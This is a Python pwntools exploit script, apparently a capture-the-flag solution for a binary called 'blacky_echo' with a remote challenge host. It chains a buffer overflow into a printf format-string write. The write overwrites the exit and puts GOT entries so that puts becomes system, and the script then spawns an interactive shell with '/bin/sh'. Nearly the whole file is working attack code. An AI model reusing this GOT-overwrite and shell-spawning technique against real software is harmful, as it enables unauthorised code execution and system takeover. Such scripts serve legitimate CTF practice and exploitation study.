# Need 3 passes
# Overflow to v3 and place a sneaky printf format string
# Overwrite exit got with main
# Then do literally whatever you want
from pwn import *
from sys import argv

def get_offset():
    for x in range(10, 15):
        p = process('./blacky_echo')
        p.sendlineafter('Size: ', str(0x10030))
        payload = 'a' * (0x10010-3) + '%{}$p'.format(x) + 'bbbbbbbbbbbbbb'
        p.sendlineafter('Input: ', payload)
        print('NUM', x) #10
        p.interactive()

def main():
    if 'debug' in argv:
        p = gdb.debug('./blacky_echo', 'b fprintf\nc')
        e = p.elf
    elif 'remote' in argv:
        p = remote('challs.m0lecon.it', 9011)
        e = ELF('./blacky_echo')
    else:
        p = process('./blacky_echo')
        e = p.elf


    main = 0x400ca5
    exit_got = e.got['exit']
    puts_got = e.got['puts']
    system_plt = e.plt['system']

    # overwrite exit with main
    writes = {exit_got: main}
    context.arch = 'amd64'
    format_str = fmtstr_payload(10, writes, numbwritten=24, write_size='int')
    p.sendlineafter('Size: ', str(0x10030))
    payload = b'a' * (0x10010-3) + format_str
    p.sendlineafter('Input: ', payload)
    #p.interactive()
    print('Payload size: {}'.format(hex(len(payload))))
    print('Format str: {}'.format(format_str))


    # overwrite puts with system
    writes = {puts_got: system_plt}
    context.arch = 'amd64'
    format_str = fmtstr_payload(10, writes, numbwritten=24, write_size='int')
    p.sendlineafter('Size: ', str(0x10030))
    payload = b'a' * (0x10010-3) + format_str
    p.sendlineafter('Input: ', payload)
    #p.interactive()
    print('Payload size: {}'.format(hex(len(payload))))
    print('Format str: {}'.format(format_str))


    # call system("/bin/sh")
    p.sendlineafter('Size: ', '20')
    p.sendlineafter('Input: ', 'ECHO->/bin/sh;')
    p.interactive()



#get_offset()
main()
